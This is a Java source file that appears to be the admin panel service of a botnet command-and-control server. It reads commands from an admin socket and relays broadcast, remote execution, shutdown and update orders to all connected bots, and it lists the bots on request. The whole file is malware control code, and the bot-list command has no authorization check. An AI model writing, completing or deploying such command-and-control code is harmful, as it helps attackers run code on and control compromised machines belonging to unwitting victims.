package it.snotix.panel;

import it.snotix.actions.*;
import it.snotix.manager.PrintManager;
import it.snotix.manager.SecurityManager;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.concurrent.CompletableFuture;

import static it.snotix.security.LicenseSystem.checkCredentials;

public class PanelService {
    public static void inizialize (Socket adminConnection) {
        CompletableFuture.runAsync(() -> {
            requestManager(adminConnection);
        });
    }

    private static void requestManager(Socket adminConnection) {
        String message;

        while ((message = recivedMessage(adminConnection)) != null) {
            if (message.startsWith("LOGIN_REQUEST")) {
                checkCredentials(message, adminConnection);
            }

            if (message.startsWith("BROADCAST")) {
                if (SecurityManager.isAutorizedAdmin(adminConnection)) {
                    BroadcastAction.sendAll(message);
                    PrintManager.action("broadcast to all client", adminConnection);
                }
            }

            if (message.startsWith("EXEC")) {
                if (SecurityManager.isAutorizedAdmin(adminConnection)) {
                    ExecAction.sendALL(message);
                    PrintManager.action("exec to all client", adminConnection);
                }
            }

            if (message.startsWith("SHUTDOWN")) {
                if (SecurityManager.isAutorizedAdmin(adminConnection)) {
                    ShutdownAction.sendALL();
                    PrintManager.action("shutdown command to all client", adminConnection);
                }
            }

            if (message.startsWith("LIST")) {
                BotlistAction.sendList(adminConnection);
            }

            if (message.contains("UPDATE")) {
                if (SecurityManager.isAutorizedAdmin(adminConnection)) {
                    UpdateAction.sendAll();
                    PrintManager.action("update command to all client", adminConnection);
                }
            }
        }
    }

    private static String recivedMessage(Socket socket) {
        String message = null;
        while (true) {
            if (socket.isConnected()) {
                try {
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    message = bufferedReader.readLine();
                } catch (IOException e) {
                    break;
                }
                return message;
            }
        }
        return message;
    }
}
